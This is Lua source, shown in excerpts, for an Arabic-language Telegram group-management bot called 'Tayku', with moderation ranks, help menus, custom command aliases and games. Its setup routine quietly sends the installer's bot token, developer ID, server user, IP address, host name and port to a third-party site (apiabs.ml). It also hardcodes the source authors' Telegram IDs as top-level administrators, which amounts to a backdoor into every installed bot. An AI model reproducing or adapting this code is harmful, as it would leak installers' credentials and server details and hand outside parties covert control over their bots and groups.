------------------------------------------------
-- This Source Was Developed By (Rio) @lllEll1.--
--   This Is The Source Channel @lllEll0 .   --
--                - Tayku -                 --
--        -- https://t.me/lllEll0 --         --
------------------------------------------------ 
...
if not DevLeo:get(Server.."IdTayku") then 
io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
local DevId = io.read():gsub(' ','') 
if tostring(DevId):match('%d+') then 
data,res = https.request("https://apiabs.ml/Api/David/index.php?Ban=Tayku&Info&Id="..DevId)
if res == 200 then
Abs = json:decode(data)
if Abs.Result.Info == 'Is_Spam' then
print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nعذرا هذا الايدي محظور من تنصيب هذا السورس\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
os.execute('lua Tayku.lua') 
end ---ifBn
if Abs.Result.Info == 'Ok' then
io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
DevLeo:set(Server.."IdTayku",DevId) 
end ---ifok
else 
...
if not DevLeo:get(Server.."TokenTayku") then 
...
DevLeo:set(Server.."TokenTayku",TokenBot) 
end  
else 
...
Config = {
DevId = DevLeo:get(Server.."IdTayku"),
TokenBot = DevLeo:get(Server.."TokenTayku"),
Tayku = DevLeo:get(Server.."TokenTayku"):match("(%d+)"),
SudoIds = {DevLeo:get(Server.."IdTayku")},
}
Create(Config, "./config.lua") 
https.request("https://apiabs.ml/Api/David/index.php?Get=Tayku&DevId="..DevLeo:get(Server.."IdTayku").."&TokenBot="..DevLeo:get(Server.."TokenTayku").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
file = io.open("Tayku.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/Tayku
token="]]..DevLeo:get(Server.."TokenTayku")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
...
./tg -s ./Tayku.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Run", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S Tayku -X kill
screen -S Tayku ./Tayku.sh
done
]]) 
file:close() 
...
local Load_Tayku = function() 
local f = io.open("./config.lua", "r") 
if not f then 
AutoSet() 
else 
f:close() 
DevLeo:del(Server.."IdTayku");DevLeo:del(Server.."TokenTayku")
end 
...
DevId = Config.DevId
SudoIds = {Config.SudoIds,1054308380,1054308380,1746681849}
Tayku = Config.Tayku
TokenBot = Config.TokenBot
NameBot = (DevLeo:get(Tayku..'Rio:NameBot') or 'تايكو')
--     Source Tayku     --
...
local Status = DevLeo:sismember(Tayku..'Rio:RioSudo:',msg.sender_user_id_) 
...
local Status = DevLeo:sismember(Tayku..'Rio:SecondSudo:',msg.sender_user_id_) 
...
function Bot(msg) 
local var = false  
if msg.sender_user_id_ == tonumber(Tayku) then  
var = true  
end  
return var  
end 
...
local Status = DevLeo:sismember(Tayku..'Rio:SudoBot:',msg.sender_user_id_) 
...
local Status = DevLeo:sismember(Tayku..'Rio:RioConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
...
----   Owner   ----
function Owner(msg) 
local Status = DevLeo:sismember(Tayku..'Rio:Owner:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevLeo:sismember(Tayku..'Rio:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevLeo:sismember(Tayku..'Rio:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevLeo:sismember(Tayku..'Rio:Managers:'..msg.chat_id_,msg.sender_user_id_) 
...
----------  Admin  ---------
function Admin(msg) 
local Status = DevLeo:sismember(Tayku..'Rio:Admins:'..msg.chat_id_,msg.sender_user_id_) 
...
---------Vip Member---------
function VipMem(msg) 
local Status = DevLeo:sismember(Tayku..'Rio:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevLeo:sismember(Tayku..'Rio:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevLeo:sismember(Tayku..'Rio:CleanerNum:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevLeo:sismember(Tayku..'Rio:CleanerMusic:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Cleaner(msg) or RioConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
...
if DevLeo:sismember(Tayku..'Rio:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
...
if DevLeo:sismember(Tayku..'Rio:BanAll:', user_id) then
var = true
else
var = false
end
...
if DevLeo:sismember(Tayku..'Rio:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
...
if DevLeo:sismember(Tayku..'Rio:MuteAll:', user_id) then
var = true
else
var = false
end
...
--     Source Tayku     --
function TaykuFiles(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Files/"..v)
if plugin.Tayku and msg then
FilesText = plugin.Tayku(msg)
end
end
end
...
if File_Name ~= "Tayku.lua" then 
send(chat,msg.id_," ᥀︙هذا الملف ليس تابع لسورس تايكو")
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/getfile?file_id='..ID_FILE) ) 
os.execute('rm -rf Tayku.lua')
...
if File_Name:lower():match('(%d+)') ~= Tayku:lower() then 
...
local info_file = io.open('./'..Tayku..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(info_file)
vardump(JsonInfo)
DevLeo:set(Tayku.."Rio:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
DevLeo:sadd(Tayku.."Rio:Groups",IdGps) 
DevLeo:set(Tayku.."Rio:Lock:Bots"..IdGps,"del") DevLeo:hset(Tayku.."Rio:Spam:Group:User"..IdGps ,"Spam:User","keed") 
...
DevLeo:set(Tayku..Lock..IdGps,true)
end
if v.RioConstructors then
for k,IdRioConstructors in pairs(v.RioConstructors) do
DevLeo:sadd(Tayku..'Rio:RioConstructor:'..IdGps,IdRioConstructors)  
print('تم رفع منشئين المجموعات')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
DevLeo:sadd(Tayku..'Rio:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
DevLeo:sadd(Tayku..'Rio:Constructor:'..IdGps,IdConstructors)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
DevLeo:sadd(Tayku..'Rio:Managers:'..IdGps,IdManagers)  
...
vardump(IdAdmins)
DevLeo:sadd(Tayku..'Rio:Admins:'..IdGps,IdAdmins)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
DevLeo:sadd(Tayku..'Rio:VipMem:'..IdGps,IdVips)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
DevLeo:set(Tayku.."Rio:Groups:Links"..IdGps,v.LinkGroups)   
print('( تم وضع روابط المجموعات )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
DevLeo:set(Tayku.."Rio:Groups:Welcomes"..IdGps,v.Welcomes)   
...
--     Source Tayku     --
local RioRank = function(msg) if SudoId(msg.sender_user_id_) then TaykuTeam  = "المطور" elseif RioSudo(msg) then TaykuTeam = "المطور" elseif SecondSudo(msg) then TaykuTeam = "المطور" elseif SudoBot(msg) then TaykuTeam = "المطور" elseif Manager(msg) then TaykuTeam = "المدير" elseif Admin(msg) then TaykuTeam = "الادمن" else TaykuTeam = "العضو" end return TaykuTeam end
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1054308380) then TaykuTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1746681849) then TaykuTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1054308380) then TaykuTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(Tayku) then TaykuTeam = 'البوت' elseif SudoId(user_id) then TaykuTeam = 'المطور الاساسي' elseif DevLeo:sismember(Tayku..'Rio:RioSudo:', user_id) then TaykuTeam = 'المطور الاساسي' elseif DevLeo:sismember(Tayku..'Rio:SecondSudo:', user_id) then TaykuTeam = 'المطور الاساسي²' elseif DevLeo:sismember(Tayku..'Rio:SudoBot:', user_id) then TaykuTeam = DevLeo:get(Tayku.."Rio:SudoBot:Rd"..chat_id) or 'المطور' elseif DevLeo:sismember(Tayku..'Rio:RioConstructor:'..chat_id, user_id) then TaykuTeam = 'المالك' elseif DevLeo:sismember(Tayku..'Rio:Owner:', user_id) then TaykuTeam = 'المالك' elseif DevLeo:sismember(Tayku..'Rio:BasicConstructor:'..chat_id, user_id) then TaykuTeam = DevLeo:get(Tayku.."Rio:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevLeo:sismember(Tayku..'Rio:Constructor:'..chat_id, user_id) then TaykuTeam = DevLeo:get(Tayku.."Rio:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevLeo:sismember(Tayku..'Rio:Managers:'..chat_id, user_id) then TaykuTeam = DevLeo:get(Tayku.."Rio:Managers:Rd"..chat_id) or 'المدير' elseif DevLeo:sismember(Tayku..'Rio:Admins:'..chat_id, user_id) then TaykuTeam = DevLeo:get(Tayku.."Rio:Admins:Rd"..chat_id) or 'الادمن' elseif DevLeo:sismember(Tayku..'Rio:VipMem:'..chat_id, user_id) then  TaykuTeam = DevLeo:get(Tayku.."Rio:VipMem:Rd"..chat_id) or 'المميز' elseif DevLeo:sismember(Tayku..'Rio:Cleaner:'..chat_id, user_id) then  TaykuTeam = DevLeo:get(Tayku.."Rio:Cleaner:Rd"..chat_id) or 'المنظف' else TaykuTeam = DevLeo:get(Tayku.."Rio:mem:Rd"..chat_id) or 'العضو' end return TaykuTeam end
--     Source Tayku     --
function RankChecking(user_id,chat_id)
if SudoId(user_id) then
var = true  
elseif tonumber(user_id) == tonumber(Tayku) then  
var = true
elseif DevLeo:sismember(Tayku..'Rio:RioSudo:', user_id) then
var = true
elseif DevLeo:sismember(Tayku..'Rio:SecondSudo:', user_id) then
var = true  
elseif DevLeo:sismember(Tayku..'Rio:SudoBot:', user_id) then
var = true 
elseif DevLeo:sismember(Tayku..'Rio:RioConstructor:'..chat_id, user_id) then
var = true
elseif DevLeo:sismember(Tayku..'Rio:Owner:'..chat_id, user_id) then
var = true
elseif DevLeo:sismember(Tayku..'Rio:BasicConstructor:'..chat_id, user_id) then
var = true
elseif DevLeo:sismember(Tayku..'Rio:Constructor:'..chat_id, user_id) then
var = true  
elseif DevLeo:sismember(Tayku..'Rio:Managers:'..chat_id, user_id) then
var = true  
elseif DevLeo:sismember(Tayku..'Rio:Admins:'..chat_id, user_id) then
var = true  
elseif DevLeo:sismember(Tayku..'Rio:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
...
local rio = (Tayku..'Rio:Filters:'..msg.chat_id_)
if rio then
local names = DevLeo:hkeys(rio)
...
local UserName = (dp.username_ or "lllEll0")
...
--     Source Tayku     --
function riomoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevLeo:get(Tayku..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source Tayku     --
function SourceCh(msg) 
local url,res = https.request('https://api-david.ml/David/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.ChatMember.Tayku ~= true then
Var = false
Text = "*᥀︙عذرا لاتستطيع استخدام البوت !\n᥀︙عليك الاشتراك في قناة السورس اولا :*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="᥀ 𝗧𝗔𝗬𝗞𝗨 : 𝗧𝗲𝗮𝗠 .",url="t.me/lllEll0"}}} 
...
local var = true 
if DevLeo:get(Tayku.."Rio:ChId") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevLeo:get(Tayku..'Rio:ChId')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevLeo:get(Tayku..'Rio:ChText') then
local ChText = DevLeo:get(Tayku..'Rio:ChText')
send(msg.chat_id_,msg.id_,'['..ChText..']')
else
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevLeo:get(Tayku.."Rio:ChId"))
local GetInfo = JSON.decode(Check)
...
if DataText == '/delyes' and DevLeo:get(Tayku..'yes'..data.sender_user_id_) == 'delyes' then
DevLeo:del(Tayku..'yes'..data.sender_user_id_, 'delyes')
DevLeo:del(Tayku..'no'..data.sender_user_id_, 'delno')
...
if DataText == '/delno' and DevLeo:get(Tayku..'no'..data.sender_user_id_) == 'delno' then
DevLeo:del(Tayku..'yes'..data.sender_user_id_, 'delyes')
DevLeo:del(Tayku..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر اطردني") 
end
--     Source Tayku     --
if DataText == '/yesdel' and DevLeo:get(Tayku..'yesdel'..data.sender_user_id_) == 'delyes' then
DevLeo:del(Tayku..'yesdel'..data.sender_user_id_, 'delyes')
DevLeo:del(Tayku..'nodel'..data.sender_user_id_, 'delno')
if DevLeo:sismember(Tayku..'Rio:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevLeo:sismember(Tayku..'Rio:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'المدراء • ' else Managers = '' end
if DevLeo:sismember(Tayku..'Rio:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevLeo:sismember(Tayku..'Rio:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevLeo:sismember(Tayku..'Rio:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = '' end
if DevLeo:sismember(Tayku..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'المطايه • ' else donky = '' end
if DevLeo:sismember(Tayku..'Rio:Constructor:'..data.chat_id_, data.sender_user_id_) or DevLeo:sismember(Tayku..'Rio:Managers:'..data.chat_id_, data.sender_user_id_) or DevLeo:sismember(Tayku..'Rio:Admins:'..data.chat_id_, data.sender_user_id_) or DevLeo:sismember(Tayku..'Rio:VipMem:'..data.chat_id_, data.sender_user_id_) or DevLeo:sismember(Tayku..'Rio:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevLeo:sismember(Tayku..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
DevLeo:srem(Tayku..'Rio:Constructor:'..data.chat_id_,data.sender_user_id_)
DevLeo:srem(Tayku..'Rio:Managers:'..data.chat_id_,data.sender_user_id_)
DevLeo:srem(Tayku..'Rio:Admins:'..data.chat_id_,data.sender_user_id_)
DevLeo:srem(Tayku..'Rio:VipMem:'..data.chat_id_,data.sender_user_id_)
DevLeo:srem(Tayku..'Rio:Cleaner:'..data.chat_id_,data.sender_user_id_)
DevLeo:srem(Tayku..'User:Donky:'..data.chat_id_,data.sender_user_id_)
...
if DevLeo:get(Tayku.."Rio:NewDev"..data.sender_user_id_) then
if DataText == '/setno' then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر تغير المطور الاساسي") 
DevLeo:del(Tayku.."Rio:NewDev"..data.sender_user_id_)
return false
end
if DataText == '/setyes' then
local NewDev = DevLeo:get(Tayku.."Rio:NewDev"..data.sender_user_id_)
...
if DataText == '/nodel' and DevLeo:get(Tayku..'nodel'..data.sender_user_id_) == 'delno' then
DevLeo:del(Tayku..'yesdel'..data.sender_user_id_, 'delyes')
DevLeo:del(Tayku..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر نزلني") 
end
if DataText == '/YesRolet' and DevLeo:get(Tayku.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local List = DevLeo:smembers(Tayku..'Rio:ListRolet'..data.chat_id_) 
local UserName = List[math.random(#List)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
DevLeo:incrby(Tayku..'Rio:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
DevLeo:del(Tayku..'Rio:ListRolet'..data.chat_id_) 
DevLeo:del(Tayku.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "᥀︙*صاحب الحظ* ↫ ["..UserName.."]\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
end
if DataText == '/NoRolet' then
DevLeo:del(Tayku..'Rio:ListRolet'..data.chat_id_) 
DevLeo:del(Tayku.."Rio:NumRolet"..data.chat_id_..data.sender_user_id_) 
DevLeo:del(Tayku.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
...
if DevLeo:sismember(Tayku..'Rio:Tkeed:'..Chat_Id2, data.sender_user_id_) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..Chat_Id2.."&user_id="..data.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevLeo:srem(Tayku..'Rio:Tkeed:'..Chat_Id2, data.sender_user_id_)
...
DevLeo:del(Tayku..'Rio:Text:GpTexts'..Rio..data.chat_id_)
DevLeo:srem(Tayku..'Rio:Manager:GpRedod'..data.chat_id_,Rio)
end
if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevLeo:smembers(Tayku..'Rio:Text:GpTexts'..Rio..data.chat_id_)
if DevLeo:get(Tayku..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم انهاء وحفظ ↫ "..#List.." من الردود المتعدده للامر ↫ "..Rio) 
DevLeo:del(Tayku..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
else
...
DevLeo:del(Tayku..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
DevLeo:del(Tayku..'Rio:Text:GpTexts'..Rio..data.chat_id_)
DevLeo:del(Tayku..'Rio:Add:GpTexts'..data.sender_user_id_..data.chat_id_)
DevLeo:srem(Tayku..'Rio:Manager:GpRedod'..data.chat_id_,Rio)
else
EditMsg(Chat_Id2, Msg_Id2, "᥀︙عذرا صلاحية الامر منتهيه !") 
end
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Help = DevLeo:get(Tayku..'Rio:Help')
local Text = [[
...
᥀︙م6 ↫ اوامر الاعضاء
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/lllEll0)
]] 
keyboard = {} 
...
local Help = DevLeo:get(Tayku..'Rio:Help1')
local Text = [[
...
local Help = DevLeo:get(Tayku..'Rio:Help2')
local Text = [[
᥀︙اوامر الادمنيه ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙الاعدادت
...
local Help = DevLeo:get(Tayku..'Rio:Help3')
local Text = [[
᥀︙اوامر المدراء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙فحص البوت
...
local Help = DevLeo:get(Tayku..'Rio:Help4')
local Text = [[
᥀︙اوامر المنشئين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تنزيل الكل
...
local Help = DevLeo:get(Tayku..'Rio:Help5')
local Text = [[
᥀︙اوامر المطورين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙الكروبات
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Help = DevLeo:get(Tayku..'Rio:Help6')
local Text = [[
᥀︙اوامر الاعضاء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
...
if text and DevLeo:get(Tayku.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevLeo:get(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevLeo:del(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevLeo:del(Tayku.."Set:Cmd:Group:New"..msg.chat_id_)
DevLeo:srem(Tayku.."List:Cmd:Group:New"..msg.chat_id_,text)
...
DevLeo:del(Tayku.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(DevLeo:get(Tayku..'Rio:NameBot') or "تايكو")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevLeo:get(Tayku..'Rio:NameBot') or "تايكو")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = DevLeo:get(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and DevLeo:get(Tayku.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevLeo:set(Tayku.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل الامر الجديد", 1, 'html')
DevLeo:del(Tayku.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevLeo:set(Tayku.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevLeo:get(Tayku.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevLeo:get(Tayku.."Set:Cmd:Group:New"..msg.chat_id_)
DevLeo:set(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevLeo:sadd(Tayku.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الامر", 1, 'html')
DevLeo:del(Tayku.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local List = DevLeo:smembers(Tayku.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "᥀︙قائمة الاوامر المضافه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
Cmds = DevLeo:get(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..k.."~ ("..v..") • {"..Cmds.."}\n"
else
t = t..k.."~ ("..v..") \n"
...
local List = DevLeo:smembers(Tayku.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
DevLeo:del(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevLeo:del(Tayku.."List:Cmd:Group:New"..msg.chat_id_)
end
...
DevLeo:set(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
DevLeo:sadd(Tayku.."List:Cmd:Group:New"..msg.chat_id_,"ا")
DevLeo:set(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
DevLeo:sadd(Tayku.."List:Cmd:Group:New"..msg.chat_id_,"م")
DevLeo:set(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
DevLeo:sadd(Tayku.."List:Cmd:Group:New"..msg.chat_id_,"اد")
DevLeo:set(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
DevLeo:sadd(Tayku.."List:Cmd:Group:New"..msg.chat_id_,"مد")
DevLeo:set(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
DevLeo:sadd(Tayku.."List:Cmd:Group:New"..msg.chat_id_,"من")
DevLeo:set(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
DevLeo:sadd(Tayku.."List:Cmd:Group:New"..msg.chat_id_,"اس")
DevLeo:set(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":مط","رفع مطور")
DevLeo:sadd(Tayku.."List:Cmd:Group:New"..msg.chat_id_,"مط")
DevLeo:set(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":ثانوي","رفع مطور ثانوي")
DevLeo:sadd(Tayku.."List:Cmd:Group:New"..msg.chat_id_,"ثانوي")
DevLeo:set(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
DevLeo:sadd(Tayku.."List:Cmd:Group:New"..msg.chat_id_,"تك")
DevLeo:set(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevLeo:sadd(Tayku.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
DevLeo:set(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevLeo:sadd(Tayku.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
DevLeo:set(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":ر","الرابط")
DevLeo:sadd(Tayku.."List:Cmd:Group:New"..msg.chat_id_,"ر")
DevLeo:set(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":رر","ردود المدير")
DevLeo:sadd(Tayku.."List:Cmd:Group:New"..msg.chat_id_,"رر")
DevLeo:set(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":،،","مسح المكتومين")
DevLeo:sadd(Tayku.."List:Cmd:Group:New"..msg.chat_id_,"،،")
DevLeo:set(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":رد","اضف رد")
DevLeo:sadd(Tayku.."List:Cmd:Group:New"..msg.chat_id_,"رد")
DevLeo:set(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":سح","مسح سحكاتي")
DevLeo:sadd(Tayku.."List:Cmd:Group:New"..msg.chat_id_,"سح")
DevLeo:set(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":رس","مسح رسائلي")
DevLeo:sadd(Tayku.."List:Cmd:Group:New"..msg.chat_id_,"رس")
DevLeo:set(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":غ","غنيلي")
DevLeo:sadd(Tayku.."List:Cmd:Group:New"..msg.chat_id_,"غ")
DevLeo:set(Tayku.."Set:Cmd:Group:New1"..msg.chat_id_..":#","مسح قائمه العام")
DevLeo:sadd(Tayku.."List:Cmd:Group:New"..msg.chat_id_,"#")
...
DevLeo:set(Tayku.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
...
DevLeo:set(Tayku.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
...
local List = DevLeo:smembers(Tayku.."Coomds"..msg.chat_id_)
if #List == 0 then
...
for k,v in pairs(List) do
var = DevLeo:get(Tayku.."Comd:New:rt:Rio:"..v..msg.chat_id_)
if var then
t = t..k.."~ "..v.." • ("..var..")\n"
else
t = t..k.."~ "..v.."\n"
...
local List = DevLeo:smembers(Tayku.."Coomds"..msg.chat_id_)
for k,v in pairs(List) do
DevLeo:del(Tayku.."Comd:New:rt:Rio:"..v..msg.chat_id_)
DevLeo:del(Tayku.."Coomds"..msg.chat_id_)
end
...
DevLeo:set(Tayku.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevLeo:sadd(Tayku.."Coomds"..msg.chat_id_,ComdNew)  
DevLeo:setex(Tayku.."Comd:New"..msg.chat_id_..msg.sender_user_id_,200,true)  
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n᥀︙ارسل الغاء لالغاء الامر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
DevLeo:del(Tayku.."Comd:New:rt:Rio:"..ComdNew..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف الصلاحيه", 1, 'html')
end
if DevLeo:get(Tayku.."Comd:New"..msg.chat_id_..msg.sender_user_id_) then 
if text and text:match("^↫ الغاء ᥀$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, 'html')
DevLeo:del(Tayku.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
...
local textn = DevLeo:get(Tayku.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevLeo:set(Tayku.."Comd:New:rt:Rio:"..textn..msg.chat_id_,text)
...
if DevLeo:sismember(Tayku.."Coomds"..msg.chat_id_,DEV_RIO) then
function by_reply(extra, result, success)   
